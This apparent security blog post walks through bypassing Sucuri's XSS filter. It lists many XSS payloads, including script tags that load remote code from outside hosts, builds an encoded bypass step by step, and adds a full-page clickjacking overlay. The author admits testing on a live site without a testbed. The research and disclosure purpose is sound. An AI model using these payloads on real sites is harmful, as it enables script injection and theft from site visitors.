@@ -1,0 +1,132 @@
+Sucuri XSS Filter
+
+Let's get to the main topic, In this post i would be revealing one of the many bypasses i found for sucuri's XSS filter. The full bypass works with user interaction, however given that you follow the given methodology you would easily be able to construct a bypass that does not require user interaction.
+
+As per the following link Sucuri's cloud proxy has a built in XSS filter capable of detection and blocking XSS attempts. "Our CloudProxy firewall does protect your site against XSS script injections if you want to prevent them from ever being used to compromise your site". So I decided to test the effectiveness, however due to absence of testbed i had to attempt it on a live website. So let's get started.
+Methodology
+
+The following is the methodology I utilize when i am up against any WAF:
+
+i) Brute Force (Throwing random payloads and known bypasses for other filters to see if they are able to bypass the filter)
+ii) Regex Reversing (The rules are reverse engineered to see what is allowed vs what is not allowed to construct a bypass)
+iii) Browser Bugs (When (i) and (ii) fails, I go with browser specific bugs such as charset inheritance, RPO etc and other quirks)
+
+For bypassing Sucuri the second methodology was utilized i.e. Regular expression reversing.
+Initial Tests - Brute Force 
+
+I made initial tests with tons of different vectors, however i quickly figured out that Brute forcing would not be the way to go about bypassing this filter.
+
+<script>alert(0);</script>
+<scrIpt>prompt(0);</script>
+<script/src="http://test.com/evil.js">
+<script>delete alert;alert(1)</script>
+<svg><script/href=//?? /> - IE
+<script src="https://www.dropbox.com/s/hp796og5p9va7zt/face.js?dl=1">
+</script
+<svg><script/href= />
+<script>confirm(0);</script>
+<iframe src="javascript:alert(2)"
+<form><isindex formaction="javascript&colon;confirm(1)>
+<embed/code=//goo.gl/nlX0P?
+<embed/src=//goo.gl/nlX0P>
+<object/data=//goo.gl/nlX0P>
+<isindex action=//goo.gl/nlX0P type=image>
+<form action=//goo.gl/nlX0P><input type="submit">
+<meta http-equiv="refresh" content="0;url=//goo.gl/nlX0P">
+<applet code="javascript:confirm(document.cookie);">
+<iframe/src="data:text/html,<iframe/src=http://jsfiddle.net/d7Xu7/1/>">
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)
+type=image>
+<isindex x="javascript:" onmouseover="alert(1)">
+Constructing A Bypass - Regex Reversing
+
+During my tests i found that <a tag along with href attribute was allowed. However i found that as soon as i enter anything after the = my vector is blocked.
+
+http://www.site.com/shop.php?c=4"><a href=http://www.google.com>CLICK</a>
+
+I thought perhaps they are detecting the regular expressions expects a SPACE after anchor tag, so i tried forward slash (/) however it was blocked.
+
+http://www.site.com/shop.php?c=4"><a/href=http://www.google.com>CLICK</a>
+
+
+
+
+
+The next option was to try characters that could be used instead of white space such as x0c which stands for "Form Feed" or perhaps newlines.
+http://www.site.com/shop.php?c=4"><a%0c href=http://www.google.com>CLICK</a>
+
+I came to the conclusion that the regex only looks for a "Space" and "Forward slash" between a tag and href attribute. However, i since Form feed only works in google chrome, i didn't wanted to generate a browser specific bypass. So, i used the following vector.
+
+http://www.site.com/shop.php?c=4"><a fooooooooooooooooooooooooooo href=http://www.google.com>CLICK</a>
+
+
+
+
+Here is how the input was being reflected.
+
+
+The next step was to use javascript, scheme to execute javaScript, however as expected it was being filtered out.
+
+
+http://www.site.com/shop.php?c="><a fooooooooooooooooooooooooooo href=javascript:alert(1)>CLICK</a>
+
+
+
+
+
+The next step was to check if the regex is filtering out case sensitive payloads. However, it was also being filtered out.
+
+http://www.site.com/shop.php?c="><a fooooooooooooooooooooooooooo href=javAsCript:alert(1)>CLICK</a>
+
+The following test was made to check if the regex was looking for a colon followed by javascript keyword.
+
+http://www.site.com/shop.php?c="><a fooooooooooooooooooooooooooo href=javAsCript:>CLICK</a>
+
+With above test it was clear that the regular expression is looking for "Javascript" keyword followed by a "Colon".  This could be easily defeated by using HTML entities such as &sol &tab &colon &NewLine. Apart from that parenthesis were also being blocked which could also be easily bypassed by using their corresponding html entities i.e. &lpar; and &rpar;.
+
+Inside of href attribute &colon; could be used instead of ":" which would be decoded by the browser at the run time.
+  
+http://www.site.com/shop.php?c=4"><a fooooooooooooooooooooooooooo href=javAsCript&colon;test>CLICK</a>
+
+
+
+
+However, as could be seen from the above figure the html entities are not being reflected back. This could be easily defeated by using hex encode to encode & and ;  signs.
+Full Bypass
+
+Combining all pieces of puzzle leads to full bypass:
+
+http://www.site.com/shop.php?c=4"><a fooooooooooooooooooooooooooooooooo href=JaVAScript%26colon%3Bprompt%26lpar%3B1%26rpar%3B%>
+
+
+
+
+
+Ethical Considerations
+
+Both the website owner and the vendor has been notified about the vulnerability.
+In Closing
+
+WAF's should only be considered as an additional layer of protection not a primary layer of protection. Due to the fact that rely upon blacklist, in almost all the situations it's possible to bypass them.
+
+Update 1: It seems like Sucuri has just blocked "Prompt" keyword, the following vector bypasses it -  <a%20x%20href=javascript%26%2358%3Bprompt(1)>a</a>  credits @mmrupp
+
+Update2: It seems like securi is now blocking "Prompt" as well as the "Confirm" keyword, the following vector bypasses it -
+
+ <q oncut=\u0070rompt(2)> 
+"><p id=""onmouseover=\u0070rompt(1) //
+
+Update 3:  @soaj1664ashar found another way to bypass the filter:
+
+"><p id="\u0070rompt(1)"onmouseover=\u0065val(id) //
+
+Update 4: Mathias Karlson used a neat trick to yet again bypass Sucuri XSS filter, he figured out that a="b" i  added a little bit of css magic to make user interaction unavoidable.
+
+<a id="a"href=javascript&colon;alert&lpar;1&rpar; id="a">Click</a>
+Unavoidable User Interaction
+
+The above bypass could be combined with with css magic to bypass it with unavoidable user interaction.
+
+<a+id="a"href=javascript%26colon;alert%26lpar;1%26rpar;+id="a" style=width:100%25;height:100%25;position:fixed;left:0;top:0 x>Click me plz</a>
+
+Subscribe to our Newsletter and receive updates directly via email - Get Ethical hacking and security tips directly to your inbox. Alternatively you can Join our Hackers Community on Facebook , Google+ and Twitter .
